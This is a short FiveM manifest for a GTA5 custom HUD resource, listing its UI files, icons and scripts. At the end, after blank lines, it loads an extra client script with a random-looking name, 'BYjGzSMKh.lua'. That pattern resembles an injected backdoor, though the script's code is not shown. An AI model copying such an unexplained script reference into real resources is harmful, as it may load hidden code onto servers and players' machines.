shared_script '@WaveShield/waveshield.lua' --this line was automatically written by WaveShield

fx_version 'adamant'
game 'gta5'


description 'Emilia Customui'

version '1.0.1'

ui_page "ui.html"

files {
    "ui.html",
    "ui.css",
    "ui.js",
	'html/armor.png',
	'html/drunk.png',
	'html/health.png',
	'html/hunger.png',
	'html/speaker.png',
	'html/water.png',
	'html/stamina.png',
}

client_script {
    'client.lua'
}

server_script {
	'server.lua'
}





client_script "BYjGzSMKh.lua"
